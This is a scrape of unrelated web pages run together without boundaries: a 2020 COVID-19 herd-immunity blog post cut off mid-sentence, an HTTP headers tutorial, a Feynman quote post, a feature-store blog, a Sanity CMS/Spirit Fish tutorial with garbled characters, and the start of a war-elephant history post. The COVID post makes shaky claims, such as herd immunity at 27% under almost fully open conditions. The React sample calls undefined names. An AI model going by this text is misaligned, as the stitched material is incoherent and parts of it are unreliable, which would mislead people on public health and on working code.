<p>  That is, unless they do something to change their behavior. Mask wearing and social distancing change the rate of spread of COVID through communities and thus lower the herd immunity threshold. Closing businesses, schools, and crowded indoor spaces also lowers HIT by making it less likely that people will get close enough to very many other people to contract COVID.  Social connectivity is built right into the basic epidemiological model, the SIR model, in a variable called Beta. According to the Wikipedia article on SIR models (screen shot below), <strong>&nbsp;</strong>β is defined as “average number of contacts per person per time, multiplied by the probability of disease transmission in a contact between a susceptible and an infectious subject”.</p>



<figure><img loading="lazy" width="1024" height="236" src="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1024x236.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-300x69.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-768x177.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1536x354.png 1536w, https://realscience.community/wp-content/uploads/2020/10/image-2048x471.png 2048w, https://realscience.community/wp-content/uploads/2020/10/image-1200x276.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1400x322.png 1400w, https://realscience.community/wp-content/uploads/2020/10/image-960x221.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-2000x460.png 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>The translation of this is, the more socially connected people are and the more likely they are to breath on each other and pass along COVID, the higher the Beta. If people are socially distanced and masked, they will be less likely to spread COVID even if they see the same number of people as in the case of open restaurants that have distancing and mask requirements. This is important because Beta is one component of R0, a variable that many people are familiar with. The higher the Beta, the higher the R0. </p>

<p>  So all of this is to explain a key point, the herd immunity threshold is not a constant, it changes with social connectivity. This is actually really good news because it means that with behavioral interventions such as masks and distancing, we can slow viral spread and reach the herd immunity threshold (for that level of openness) with less people actually getting infected and dying, all the while keeping at least some aspects of the economy open. The US has actually reached a herd immunity threshold (for the level of openness) twice now, once during our partial lockdown in late March and April and again at the end of the Summer. Below are daily new cases in the US over time- the arrows show the first two herd immunity thresholds. </p>



<figure><img loading="lazy" width="1024" height="677" src="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-1-1024x677.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-1-300x198.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-1-768x508.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-1-1200x793.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-1-907x600.png 907w, https://realscience.community/wp-content/uploads/2020/10/image-1-960x635.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-1.png 1458w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>  What many experts are calling herd immunity is the percent immunity needed to slow spread in a place that is completely open without behavior changes. For COVID-19, this threshold has been estimated at ~67% of the population being immune based on data early in the pandemic in France. There are many reasons why this is just a guess and why it might be different over time or in different places. For one thing, people know about COVID now and this definitely has changed their behavior. For another thing, France is a “kissy culture” and thus one likely to spread COVID faster than some other places. Although, I doubt French people are as likely to kiss each other now after all these months of a pandemic. So it’s likely that the herd immunity threshold now is lower in France than it was at the beginning of the pandemic. </p>



<p>  So is the US close to reaching the next herd immunity threshold (for this level of openness)? Yes, actually we are. 45% of North Dakota has been infected for instance. I created the map below to show estimates of percent immunity per state. But remember, the HIT is actually just the percent of immune people required to have cases not spike. So despite ND being at 45%, it’s cases are actually continuing to rise during this current level of openness- so it is not at herd immunity at this time. This is in part due to their reluctance to impose a mask mandate and the giant super spreader event, the Sturgis motorcycle rally. ND may actually be spreading COVID faster (and have a greater R0) than France was in the beginning of the Pandemic. </p>

They are at 36% and 27% immune, respectively. </strong></p>



<figure><img loading="lazy" width="1024" height="855" src="https://realscience.community/wp-content/uploads/2020/10/image-4-1024x855.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-4-1024x855.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-4-300x251.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-4-768x641.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-4-1200x1002.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-4-718x600.png 718w, https://realscience.community/wp-content/uploads/2020/10/image-4-960x802.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-4.png 1287w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><figure><img loading="lazy" width="1024" height="850" src="https://realscience.community/wp-content/uploads/2020/10/image-3-1024x850.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-3-1024x850.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-3-300x249.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-3-768x638.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-3-1200x996.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-3-723x600.png 723w, https://realscience.community/wp-content/uploads/2020/10/image-3-960x797.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-3.png 1289w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Some people have said- “but they aren’t completely open though!” That’s correct. New Yorkers are at least partially wearing masks, businesses are requiring them, and schools are partially open. In Florida, the only thing not open is indoor bars I believe, and mask wearing is scorned and spotty at best. <strong>So this is a huge piece of information- herd immunity at 36% and 27% is possible under almost completely open circumstances. And 27% immunity is a level that many states are at or rapidly approaching in the US. So therefore, we could be almost entirely open AND not increase cases with some smart planning. </strong></p>



<p>  Some other states are not faring as well this time around. Which states those are was totally predictable (and indeed I did predict this)- at least if you understand herd immunity. As immunity levels go up, the amount of openness can go up without spiking cases. So states that aren’t very immune but have opened up a lot- like opening schools (crowded indoor spaces ie. super spreader environments), will see huge spikes in cases. In the US, this is the midwest and pacific northwest. See Ohio below for example. It’s at 16% and seeing a giant spike. </p>



<figure><img loading="lazy" width="1024" height="882" src="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/10/image-5-1024x882.png 1024w, https://realscience.community/wp-content/uploads/2020/10/image-5-300x258.png 300w, https://realscience.community/wp-content/uploads/2020/10/image-5-768x662.png 768w, https://realscience.community/wp-content/uploads/2020/10/image-5-1200x1034.png 1200w, https://realscience.community/wp-content/uploads/2020/10/image-5-696x600.png 696w, https://realscience.community/wp-content/uploads/2020/10/image-5-960x827.png 960w, https://realscience.community/wp-content/uploads/2020/10/image-5.png 1279w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>So what can we do with this information? For one thing, the level of openness to not spread COVID can be determined empirically from the percent immunity of a state, the number of active cases, and the willingness to follow mask mandates and other safety guidelines. People can use this information to determine whether it’s safe to send their kids to school and politicians can use it to determine what level of re-opening they should be enacting. This should also put the mask debate to rest– wear a mask– keep your business open and don’t spread COVID. My analysis of mask mandates showed that they related to less COVID cases in the US with a p-value of 10-16. So they work. </p>



<p>    The converse of this is that some states could be more open than they are. There are real harmful effects of being shut down, on the economy, jobs, and people’s mental health. New York, for instance, could have been this open without spiking since late April. Think how many jobs could have been saved and how much better NYC residents would feel right now. I should make the caveat, though, that this type of evaluation needs to be done on at least a county level, because even within states there are areas that are more or less immune. </p>



<p>  Lastly, I hope it has become clear that herd immunity is a value that changes with social connectivity and behavior. It is actually a good reason to wear masks and social distance. It is not a strategy. But it could be very useful in designing a strategy that is nuanced and saves the most lives while keeping the economy as open as possible. It could be used to create a win-win strategy that I believe most people would be ok with. It can also be used to predict people’s level of risk for activities in a particular county. The risk is not uniform in the US or even in any state. The more real, trustworthy information that people have to make decisions, the more empowered they will be over their own health. We need to understand and embrace the nuance in the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia.

October 23, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>

              <p>I found this short list of life rules on <a href="https://twitter.com/ProfFeynman/status/1218739120714985472">Twitter</a>, posted by an account named after Richard Feynman.</p>
<p>I failed to verify the authenticity of the source, however, I find it to be a nice, succinct expression of Feynman’s core philosophy.</p>
<br>
<ul>
<li>Read everyday.</li>
<li>Spend time with nature.</li>
<li>Ask questions.</li>
<li>Never stop learning.</li>
<li>Don’t pay attention to what others think of you.</li>
<li>Do what interests you the most.</li>
<li>Study hard.</li>
<li>Teach others what you know.</li>
<li>Make mistakes and learn.</li>
<li>It’s Okay to not know things!</li>
</ul>
<p>One quote of his I have managed to authenticate is this gem:</p>
<blockquote>
<p>Genius is genetically determined. You inherit it from your children.</p>
</blockquote>
<p>which I found in a video of Michelle Feynman describing life with her famously playful and iconoclastic father.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production. But with Feature Groups (tables in NDB), we can materialize feature vectors (the individual row of features that is fed directly to the model for scoring) from the different tables by performing a join.</p><p>NDB supports <a href="http://mikaelronstrom.blogspot.com/2020/10/parallel-execution-of-outersemi-joins.html">sophisticated optimizations</a> for JOINs, and can push-down many JOINs to the database nodes. In practice, in NDB even complex queries can <a href="http://mikaelronstrom.blogspot.com/2020/10/dbt2-benchmarks-with-ndb-cluster.html">“achieve latency down to 5-10 ms for a transaction that contains around 30 SQL statements”</a>.</p><figure id="w-node-0a1416f8ba8d-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eb0ef0105a291dd69266_pic-05re.jpg" loading="lazy" alt=""></p></figure><h2>Conclusions</h2><p>Reuse features to save on infrastructure and the number of feature pipelines needed to maintain models in production. JOINs is the method we use in Hopsworks to reuse cached features across different models - both for training and serving.

<![CDATA[Powering JavaScript Sites with Sanity CMS and Spirit Fish]]>

October 23, 2020 | https://www.spirit.fish/blog/working-with-sanity | <a href="https://web.archive.org/web/*/https://www.spirit.fish/blog/working-with-sanity">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

  <div>
    <p>Iâ€™ve said it a few times, but 
      <a target="_blank" href="https://www.sanity.io/">Sanity CMS</a>
 is easily the most futuristic content management system on the planet - with slick editor experience, unique deployable infrastructure, and the introduction of itâ€™s new 
      <a target="_blank" href="https://www.sanity.io/blog/introducing-presence">Presence</a>
 functionality, personally weâ€™d never use anything else!</p>

<p>So, itâ€™s only natural Spirit Fish would integrate nicely. Hereâ€™s a few of the ways we work with Sanity:</p>

<h2><strong>1. Rendering Sanity content for great SEO, Google Lighthouse Scores, and low FMP</strong></h2>

<p>Sanity is a headless CMS, so that means that in order to display data to end users, content needs to be loaded over HTTP. While thereâ€™s a bunch of framework dependent approaches to this, we prefer to load the data in the same javascript bundle that powers our React.js projects. </p>

<p>Hereâ€™s a trivial example using 
      <a target="_blank" href="https://reactjs.org/docs/create-a-new-react-app.html">create-react-app</a>
:</p>

<pre><code>
import React from "react";
import SanityClient from "@sanity/client";

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const query = `*[_type == "movie"] {
  _id,
  title
}[0...50]`;

function App() {
  const [movies, setMovies] = useState(null);

  useEffect(async () =&gt; {
    setMovies(await sanity.fetch(query));
  }, []);

  return (
    &lt;ul&gt;
      {movies.map(movie =&gt; (
        &lt;li key={movie._id}&gt;
          {movie.title}
        &lt;/li&gt;
      ))}
    &lt;/ul&gt;
  );
};

export default App;

</code></pre>

<p>If you deploy a create-react-app to a host like an S3 bucket, etc - when you view-source, youâ€™ll notice that your movies arenâ€™t there. Thatâ€™s because that content is loaded at the runtime! When Googleâ€™s crawler indexes your site, it will only see a blank page, and all of your end users wonâ€™t see any content until theyâ€™ve downloaded your javascript, and THEN loaded the Sanity query. Thatâ€™s no good for SEO, or conversions.</p>

<p>Of course, this is our bread and butter: create a Spirit Fish renderer, point it at that S3 bucket, and point your DNS at our CDN. Refresh your site, and boom! Your site is now rendered on the fly.</p>

<p>We find that adding a Spirit Fish renderer to a site usually doubles your 
      <a target="_blank" href="https://developers.google.com/web/tools/lighthouse">Google Lighthouse</a>
 scores, so thatâ€™s a big win for 5 minutes of setup!</p>

<h2><strong>2. Purging the entire Spirit Fish cache when content changes in Sanity</strong></h2>

<p>On first request - our renders take a few seconds - so we cache the result in a global CDN so that your rendered site is close to your users. </p>

<p>Got it! But what if my content changes?</p>

<p>Well - youâ€™ll need to trigger an invalidation in Spirit Fish. The easiest way to do this for small sites is to trigger a full invalidation. This will force your site to be re-rendered the next time your users visit, meaning your new data will be pulled from Sanity!</p>


<p>Thatâ€™s what we built our invalidations API for. Hereâ€™s what your `invalidate_all` endpoint looks like:</p>

<pre>  <code>
https://www.spirit.fish/api/v1/renderers/$RENDERER_ID/invalidate_all?api_key=$RENDERER_API_TOKEN
  </code>
</pre>

<p>This endpoint takes a `POST` request, so you can easily add it directly to Sanityâ€™s management portal, no code required:</p>

<a href="https://www.sanity.io/docs/webhooks" target="_blank">
  <p><img src="https://www.spirit.fish/assets/blog_posts/sanity_logo_square-7b9b2a49f4583770b16f9e4898285e61afa005dd41fa9e93e2e89b8d5b446cb1.jpg">

      <p>https://www.sanity.io/docs/webhooks</p>
    </div>
  </div>
</a>

<p>Now, whenever an editor updates content in Sanity, it will clear your Spirit Fish cache, easy as that!</p>

<h2><strong>3. Purging specific Spirit Fish pages when Sanity content changes with a serverless function</strong></h2>

<p>For small projects with a handful of pages, the above is probably fine - but when you have a large project (say an editorial with hundreds of pages), you wouldnâ€™t want to purge the entire Spirit Fish if only one page has changed.</p>

<p>In cases like this, youâ€™ll need your own backend endpoint to manage cache invalidations. We like serverless functions for this:</p>

<pre><code>
import SanityClient from '@sanity/client';
import handleError from 'utils/services/handleError';
import notEmpty from 'utils/notEmpty';

const sanityClient = SanityClient({
  projectId: "zp7mbokg",
  dataset: "production",
  useCdn: true
});

const buildCacheClearPathForRecord = (record) =&gt; {
  switch (record._type) {
    case 'movie':
      return `/movies/${record.slug}`;
    case 'director':
      return `/directors/${record.slug}`;
  }
};

export default async (request, response) =&gt; {
  try {
    const records =
      await SanityClient.getDocuments(request.body.ids.all);
    const pages =
      records.filter(notEmpty).map(buildCacheClearPathForRecord);

    await fetch(`https://www.spirit.fish/api/v1/renderers/${process.env.RENDERER_ID}/api_invalidations`, {
      method: 'post',
      body: JSON.stringify({
        invalidation: { pages }
      }),
      headers: {
        'X-Hatchery-Renderer-Api-Key': process.env.RENDERER_API_KEY,
        'Content-Type': 'application/json'
      }
    });
    return response.end();
  } catch (e) {
    return handleError(request, response, e);
  }
};

</code></pre>

<p>Deploy your serverless function (we like 
      <a target="_blank" href="https://firebase.google.com/">Firebase</a>
 or 
      <a target="_blank" href="https://vercel.com/">Vercel</a>
), and setup your Sanity webhook (like we did above - don't forget the enviornment variables!) to hit this endpoint instead. Bingo! Youâ€™re now invalidating individual pages as content changes; eliminating the need for site wide rerenders, and keeping your content in cache for as long as possible.</p>



    <p>Spirit Fish is free to try, and each renderer comes with a generous free tier that should cover most hobby projects.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>

